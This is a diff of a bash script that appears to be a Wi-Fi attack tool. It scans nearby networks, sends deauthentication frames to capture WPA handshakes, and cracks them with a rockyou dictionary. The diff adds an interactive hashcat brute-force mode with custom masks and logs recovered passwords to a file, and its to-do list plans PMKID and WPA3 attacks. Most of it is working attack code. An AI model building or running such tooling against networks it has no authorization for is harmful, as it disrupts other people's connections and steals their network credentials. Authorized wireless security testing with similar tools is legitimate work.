@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.1 13/1/25 19:18
+# version: 3.2 18/1/25 05:26
 
 
 ### To Do ###
@@ -8,7 +8,7 @@
 # add more dictioneries than rockyou?
 # specific passwords lists for different vendors
 # functions to crack PMKID (using hcxpcapngtool..)
-# crack with hashcat - can look default vendors length (for example: ZTE - 8 capital and numbers)
+# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
 # cracking using GPU
 # find attacks for WPA2-WPA3, WPA3
 
@@ -247,6 +247,10 @@ function network_scanner() {
 }
 
 
+
+# ------------------------------
+# Select Network
+# ------------------------------
 function choose_network() {
     while :; do
         # Prompt the user to choose a row number
@@ -351,9 +355,9 @@ function choose_network() {
 
 
 
-
-
-
+# ------------------------------
+# Validate Network
+# ------------------------------
 function validate_network() {
 
         echo -e "\e[1mValidating network:\e[0m"
@@ -375,7 +379,6 @@ function validate_network() {
 	    another_scan_prompt
 	fi
 }
-
 
 
 
@@ -473,7 +476,7 @@ function deauth_attack() {
 		for ((j=1; j<=18; j++)); do
 		    sleep 1
 		    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
-		        echo -e "\033[1;32m->> Got the handshake!\033[0m"
+		        echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
 		        sudo pkill aireplay-ng
 			sudo pkill airodump-ng
 			echo
@@ -512,12 +515,144 @@ function dictionary_attack() {
             rm -r $targets_path/"$bssid_name" 
 	    exit 1
 	else
-	    echo -e "\nCouldn't finf a match from rockyou wordlist.."
+	    echo -e "\nCouldn't finf a match from rockyou wordlist..\n"
 	    sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not found in rockyou.txt" "$targets_path/wifi_passwords.txt"
-	    another_scan_prompt
+	    
+	    read -p "Do you want to crack with Hashcat (Y/n)? " choice
+	    case $choice in
+		    y|Y)
+			hashcat_crack
+			;;
+		    n|N)
+			another_scan_prompt
+			;;
+		    *)
+			echo "Invalid choice. Please enter 'y' or 'n'."
+			;;
+	     esac 	    
 	fi
 }
 
+
+# ------------------------------
+# Password Cracking (Hashcat)
+# ------------------------------
+function hashcat_crack() {
+    #echo -e "\033[1;34mConverting capture file to hashcat format..\033[0m\n"
+    hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
+
+    # Ask user for password length
+    while true; do
+        read -p "Enter the password length (Wi-Fi minimum length is 8): " password_length
+
+        # Validate password length
+        if [[ "$password_length" =~ ^[0-9]+$ ]] && [[ "$password_length" -gt 0 ]]; then
+            break
+        else
+            echo "Invalid password length. Please enter a positive number."
+        fi
+    done
+
+    # Ask user if they want to try every possible combination or customize each position
+    while true; do
+        echo -e "\nChoose an option:"
+        echo "1) Try every possible combination"
+        echo "2) Customize each position"
+        read -p "Enter your choice (1 or 2): " option
+
+        full_mask=""
+        if [[ "$option" -eq 1 ]]; then
+            echo -e "\nWe will check all possible characters (ABC-abc-123-!@#) for each position."
+            char_set="?a"
+            
+            # Generate the full mask
+            for (( i=0; i<password_length; i++ )); do
+                full_mask+="$char_set"
+            done
+            break
+        elif [[ "$option" -eq 2 ]]; then
+            echo -e "\nAvailable options for each position:"
+            echo "  1) Uppercase             - ?u -   (ABC)"
+            echo "  2) Lowercase             - ?l -   (abc)"
+            echo "  3) Numbers               - ?d -   (123)"
+            echo "  4) Special character     - ?s -   (!@#)"
+            echo "  5) All character types   - ?a -   (ABC-abc-123-!@#)"
+            echo "  6) Enter a specific character:__"
+            echo -e "\n\n\n"
+
+            # Initialize an array for current positions
+            positions=()
+            
+            for (( i=1; i<=password_length; i++ )); do
+                # Clear the previous line and update the mask
+                tput cuu1; tput cuu1; tput el;
+                echo -n "Current mask: [${positions[*]}]"
+                echo
+                
+                # Prompt for position choice
+                while true; do
+                    read -p "Choose an option for position $i (1-6): " choice
+
+                    case "$choice" in
+                        1) positions+=("?u"); break;; 
+                        2) positions+=("?l"); break;; 
+                        3) positions+=("?d"); break;;
+                        4) positions+=("?s"); break;;
+                        5) positions+=("?a"); break;;
+                        6) 
+                            read -p "  Enter the specific character for position $i: " specific_char
+                            if [[ ${#specific_char} -eq 1 ]]; then
+                                positions+=("$specific_char")
+                                tput cuu1; tput el
+                                break
+                            else
+                                echo "You must enter exactly one character."
+                                tput cuu1; tput el
+                            fi
+                            
+                            ;;
+                        *) echo "Invalid choice. Please enter a valid option."
+                           tput cuu1; tput el; tput cuu1; tput el;;
+                    esac
+                done
+            done
+            full_mask=$(IFS=; echo "${positions[*]}")
+            break
+        else
+            echo "Invalid option. Please enter either 1 or 2."
+        fi
+    done
+    
+    echo -e "\033[1;33mGenerated mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"
+    echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\n\e[0m\n"
+    hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --potfile-disable
+        
+    echo
+    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
+        wifi_pass=$(grep "$bssid_name" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name:" '{print $2}')
+        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
+        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
+        rm -r $targets_path/"$bssid_name" 
+        exit 1
+    else
+        echo -e "\n\033[1;31m\033[1mCouldn't cracked with Hashcat..\033[0m\n"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Hashcat" "$targets_path/wifi_passwords.txt"
+        
+	read -p "Do you want to run a dictionary attack (Y/n)? " choice
+	case $choice in
+	    y|Y)
+		dictionary_attack
+		;;
+	    n|N)
+		another_scan_prompt
+		;;
+	    *)
+		echo "Invalid choice. Please enter 'y' or 'n'."
+		;;
+	esac        
+    fi
+}
 
 
 # ------------------------------
@@ -576,8 +711,27 @@ function main_process() {
 	devices_scanner
 	deauth_attack
 	cleanup
-	dictionary_attack
-	#rm -r $targets_path/"$bssid_name"
+	
+	# Choose Attack
+	while true; do
+	    echo -e "\e[1m\nChoose an Attack:\e[0m"
+	    echo "1) Dictionary attack (rockyou)"
+	    echo "2) Hashcat crack"
+	    read -p "Enter your choice: " choice
+	    echo
+
+	    case $choice in
+		1)
+		    dictionary_attack
+		    ;;
+		2)
+		    hashcat_crack
+		    ;;
+		*)
+		    echo "Invalid choice. Please select 1 or 2."
+		    ;;
+	    esac
+	done	
 }
 
 
@@ -589,6 +743,4 @@ install_dependencies
 check_wordlist
 adapter_config
 main_process
-
-
 
